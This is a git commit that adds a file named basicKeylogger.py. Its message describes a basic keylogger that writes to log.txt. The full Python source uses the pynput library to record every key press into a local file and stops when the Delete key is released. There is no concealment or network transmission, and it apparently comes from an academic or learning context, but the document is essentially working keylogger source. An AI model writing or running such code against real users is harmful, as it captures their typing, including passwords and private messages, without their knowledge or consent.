6a2305a47cafab1c2060555b221bd7c57e9b33f0
Giuseppe Meo <gm17417@essex.ac.uk>
2022-03-13 01:44:28 +0000

    Adding basic keylogger which writes to log.txt

---
+++ basicKeylogger.py
@@ -0,0 +1,26 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+
+
+def write_file(keys):
+    with open('log.txt', 'w') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            f.write(k)
+            f.write(' ')
+
+
+def on_release(key):
+    if key == Key.delete:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
